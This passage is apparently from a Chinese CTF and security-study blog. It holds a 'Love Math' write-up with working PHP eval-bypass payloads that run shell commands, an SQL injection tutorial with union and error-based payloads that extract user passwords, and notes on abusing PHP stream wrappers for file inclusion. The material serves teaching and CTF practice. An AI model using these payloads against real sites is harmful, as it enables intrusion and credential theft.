"_contents";&lt;br&gt;Setting target: $s = "$q$r";&lt;br&gt;Reading target: $s = "file_get_contents";&lt;br&gt;Setting target: $t = "&#123;$s($p)&#125;";&lt;br&gt;Reading target: $t = "flag&#123;dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3&#125;\n";&lt;br&gt;3..2..1..Fire!&lt;br&gt;All 20 missiles are launched...&lt;br&gt;Cruising...&lt;br&gt;Engaging...Bull\'s-eye!&lt;br&gt;All targets are eliminated.&lt;br&gt;'&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>De1CTF</tag>
        <tag>命令执行</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录7</title>
    <url>/2020/01/10/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%957/</url>
    <content><![CDATA[<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="CISCN 2019 初赛 Love Math"></a>CISCN 2019 初赛 Love Math</h2><h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p><code>eval</code>可以执行PHP语句</p>
<p><code>hex2bin</code>可以将十六进制的字符转成字符串，结果是字符串类型</p>
<p><code>dechex</code>将十进制转换成十六进制，结果是字符串类型</p>
<p>PHP中数组除了可以使用[ ]  还可以使用{ }</p>
<p>PHP中调用shell命令使用<code>system()</code></p>
<a id="more"></a>

<p>PHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型</p>
<p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/88778852" target="_blank" rel="noopener">https://blog.csdn.net/Auuuuuuuu/article/details/88778852</a></p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>源码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。</p>
<p>最后有一个<code>eval</code>可以执行PHP语句，想办法构造$_GET或者$_POST</p>
<p>可以利用函数转变也可以使用异或</p>
<h2 id="0x03-操作"><a href="#0x03-操作" class="headerlink" title="0x03 操作"></a>0x03 操作</h2><p>payload1：<code>?sin=cat /flag&amp;cos=system&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})</code></p>
<p><img src="/pic/23.png" alt=""></p>
<p>异或方法</p>
<p>开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$need=[<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_REQUEST'</span>];</span><br><span class="line">$whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($whitelist <span class="keyword">as</span> $item )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($need <span class="keyword">as</span> $x)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($x ^ $item^ $item ,$need))  <span class="comment">//在PHP中异或</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $x ^ $item;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'|--- '</span>.$x.<span class="string">' --- '</span>.$item;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'|&lt;br/&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在结果中发现有一个纯数字的还有一个<code>9**0</code>,但是没想到怎么利用<code>9**0</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">9**0|--- _GET --- fmod|</span><br><span class="line">8<span class="string">"1&amp;|--- _GET --- getrandmax|</span></span><br><span class="line"><span class="string">85;!5|--- _POST --- getrandmax|</span></span><br><span class="line"><span class="string">871#4+79|--- _REQUEST --- getrandmax|</span></span><br><span class="line"><span class="string">7"</span>=0|--- _GET --- hexdec|</span><br><span class="line">75771|--- _POST --- hexdec|</span><br><span class="line">7&gt;5;|--- _GET --- hypot|</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})</code></p>
<p>post 数据：<code>abs=system&amp;cos=cat /flag</code></p>
<p><img src="/pic/24.png" alt=""></p>
<p>在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型</p>
<p><img src="/pic/25.png" alt=""></p>
<p><img src="/pic/26.png" alt=""></p>
<p><img src="/pic/27.png" alt=""></p>
<p>PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入的原理</title>
    <url>/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<a id="more"></a>

<h2 id="0x01-某些函数的使用方法"><a href="#0x01-某些函数的使用方法" class="headerlink" title="0x01 某些函数的使用方法"></a>0x01 某些函数的使用方法</h2><ol>
<li><p>concat(str1,str2,str3,…),将多个字符串连接成一个字符串。</p>
</li>
<li><p>concat_ws(分隔符, str1, str2, …),添加了分割符（concat_ws就是concat with separator）</p>
</li>
<li><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
</li>
</ol>
<p><a href="https://blog.csdn.net/Mary19920410/article/details/76545053" target="_blank" rel="noopener">参考文章</a></p>
<ol start="4">
<li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>
</li>
<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 </p>
<ul>
<li>MySQL: SUBSTR( ), SUBSTRING( )</li>
<li>Oracle: SUBSTR( )</li>
<li>SQL Server: SUBSTRING( ) </li>
</ul>
</li>
<li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>
</li>
<li><p>sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果</p>
</li>
<li><p>Length() 返回字符串的长度</p>
</li>
<li><p>database() 返回当前数据库名称</p>
</li>
<li><p>count(*) ,计数</p>
</li>
<li><p>floor(value)函数返回小于或等于指定值（value）的最小整数</p>
</li>
<li><p>ceiling(value)函数返回大于或等于指定值（value）的最小整数</p>
</li>
<li><p>rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为<code>0.15522042769493574</code></p>
</li>
<li><p>查询xml函数<strong>extractvalue(目标xml文档，xml路径)</strong>与更新xml函数<strong>updatexml(目标xml文档，xml路径，更新的内容)</strong>  最大只能出32字符</p>
</li>
<li><p>reverse(str)翻转字符串</p>
</li>
<li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>
</li>
<li><p>set 可以设置变量</p>
</li>
<li><p>prepare 预处理</p>
</li>
<li></li>
</ol>
<h2 id="0x02-操作过程与分析"><a href="#0x02-操作过程与分析" class="headerlink" title="0x02 操作过程与分析"></a>0x02 操作过程与分析</h2><h3 id="a-基本注入"><a href="#a-基本注入" class="headerlink" title="a. 基本注入"></a>a. 基本注入</h3><ol>
<li><p>使用order/group by 判断字段长度</p>
<p>users表中内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from users</span></span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>

<p><code>?id=%27 order by 3 %23</code></p>
<p><code>?id=%27 order by 4 %23</code></p>
<p><img src="/pic/28.png" alt=""></p>
<p><img src="/pic/29.png" alt=""></p>
<p>4报错，3没有报错，表示此表有三列。</p>
<p><em>sql 控制台的执行结果</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>查看回显位置</p>
<p><code>?id=%27 union select 1,2,3 %23</code></p>
<p><img src="/pic/30.png" alt="">  2，3处有回显。</p>
<p><em>sql控制台执行结果</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。</p>
</li>
<li><p>获取数据库名</p>
<p><code>?id=%27 union select 1,database() ,3 %23</code></p>
<p><img src="/pic/31.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | security | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取表名</p>
<p>在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名</p>
<p><img src="/32.png" alt=""></p>
<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
<p><img src="/33.png" alt=""></p>
</li>
<li><p>获取列名</p>
<p>在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
<p><img src="/34.png" alt=""></p>
</li>
<li><p>获取内容</p>
<p>获取users表的username和password</p>
<p><code>?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23</code></p>
<p><img src="/35.png" alt=""></p>
</li>
</ol>
<h3 id="b-报错注入"><a href="#b-报错注入" class="headerlink" title="b. 报错注入"></a>b. 报错注入</h3><ol>
<li><p>查询数据库</p>
<p><code>?id=0&#39; and updatexml(1,concat(1,(select database())),1)%23</code></p>
<p>或者<code>?id=0&#39; and extractvalue(1,concat(1,(select database())))%23</code></p>
<p><code>?id=0&#39; and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code>(在测试时，这一条buu上无回显，但是本地是可以的，<strong>此条语句最多能显示64个字符，上面两条最多32个</strong>)</p>
<p><img src="/36.png" alt=""></p>
</li>
<li><p>查询表名 <em>与基本注入相同不在重复</em></p>
</li>
<li><p>查询列名 <em>与基本注入相同不在重复</em></p>
</li>
<li><p>查信息</p>
<p><code>?id=0&#39; and extractvalue(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )))%23</code></p>
<p>或者</p>
<p><code>?id=0&#39; and updatexml(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )),1)%23</code></p>
<p>或者</p>
<p><code>?id=0&#39; and (select 0 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
<p>通过修改limit 一条一条查询</p>
</li>
</ol>
<h3 id="c-输出文件注入"><a href="#c-输出文件注入" class="headerlink" title="c. 输出文件注入"></a>c. 输出文件注入</h3>]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PHP伪协议的分析</title>
    <url>/2020/01/03/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="0X00-简介"><a href="#0X00-简介" class="headerlink" title="0X00 简介"></a>0X00 简介</h3><p>PHP支持的协议和封装协议</p>
<ul>
<li><p><a href="https://www.php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">file://</a>   </p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.http.php" target="_blank" rel="noopener">http://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.ftp.php" target="_blank" rel="noopener">ftp://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a>     </p>
<a id="more"></a>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">zlib://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a>    </p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank" rel="noopener">glob://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">phar://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.ssh2.php" target="_blank" rel="noopener">ssh2://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.rar.php" target="_blank" rel="noopener">rar://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.audio.php" target="_blank" rel="noopener">ogg://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.expect.php" target="_blank" rel="noopener">expect://</a></p>
</li>
</ul>
<p>常见的文件包含函数：</p>
<p><strong>1. include函数</strong></p>
<p>通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用</p>
<p>不能够读取自己，否则会出现逻辑错误</p>
<p>如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容</p>
<p>若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php</p>
<p>使用时如果有多个文件符合，只会输出第一个</p>
<p><strong>2. highlight_file函数</strong></p>
<p>将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件<br>如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串</p>
<h4 id="3-show-source函数"><a href="#3-show-source函数" class="headerlink" title="3. show_source函数"></a>3. show_source函数</h4><p>上面函数的别名，功能是一样的</p>
<p><strong>4. file_get_contents函数</strong></p>
<p>将一个文件读入一个字符串<br>包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密</p>
<p><strong>5. fopen函数</strong></p>
<p>因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容</p>
<p><strong>6. readfile函数</strong></p>
<p>功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)</p>
<p><strong>7. file函数</strong></p>
<p>功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容</p>
<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>
<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>
<h3 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01  file://"></a>0x01  file://</h3><p>file://不受<code>allow_url_fopen、allow_url_include·</code>影响</p>
<blockquote>
<p>file:// [文件的绝对路径和文件名]</p>
</blockquote>
<p><a href="http://127.0.0.1/temp.php?file=file:///wamp/www/1.php" target="_blank" rel="noopener">http://127.0.0.1/temp.php?file=file:///wamp/www/1.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/pic/14.png" alt=""></p>
<p><strong>截断</strong></p>
<p>若读取的文件为非PHP后缀，在php版本&lt;=5.2可使用%00截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;].’.php’);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-php"><a href="#0x02-php" class="headerlink" title="0x02 php://"></a>0x02 php://</h3><p>无需<code>allow_url_fopen on</code>，仅<code>php://input、 php://stdin、 php://memory 、php://temp</code> 需要开启<code>allow_url_include</code>。</p>
<p>php:// 访问各个输入/输出流（I/O streams）</p>
<ol>
<li><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4></li>
</ol>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">allow_url_include</a></td>
<td align="left">仅 <em>php://input<em>、 *php://stdin</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">仅 <em>php://stdin<em>、 *php://input</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许追加</td>
<td align="left">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>（等于写入）</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">仅 <em>php://fd*、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">仅仅支持 <a href="https://www.php.net/manual/zh/function.stream-select.php" target="_blank" rel="noopener">stream_select()</a></td>
<td align="left"><em>php://stdin<em>、 *php://stdout</em>、 <em>php://stderr</em>、 *php://fd</em> 和 <em>php://temp</em>。</td>
</tr>
</tbody></table>
<p>​    a. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （<em>include、highlight_file、show_source、readfile</em>可用）</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>resource=&lt;要过滤的数据流&gt;</em></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="left"><em>read=&lt;读链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr>
<td align="left"><em>write=&lt;写链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr>
<td align="left">*&lt;；两个链的筛选列表&gt;*</td>
<td align="left">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>常用筛选过滤列表</p>
<blockquote>
<ol>
<li>string.rot13  rot13加密</li>
<li>string.toupper   转换成大写</li>
<li>string.tolower   转换成小写</li>
<li>string.srip_tags   去除标签</li>
<li>convert.base64-encode &amp; convert.base64-decode</li>
<li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>
</ol>
</blockquote>
<p><img src="/pic/15.png" alt=""></p>
<p><img src="/pic/16.png" alt=""></p>
<p><img src="/pic/17.png" alt="">已经把&lt; &gt;中的数据去除 所以已经没有数据</p>
<ol start="2">
<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p> <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。此协议多用于命令执行需要<strong>allow_url_include：on</strong></p>
</li>
</ol>
<p>​      <img src="/pic/18.png" alt=""> </p>
<p>​       <img src="/pic/19.png" alt=""></p>
<ol start="3">
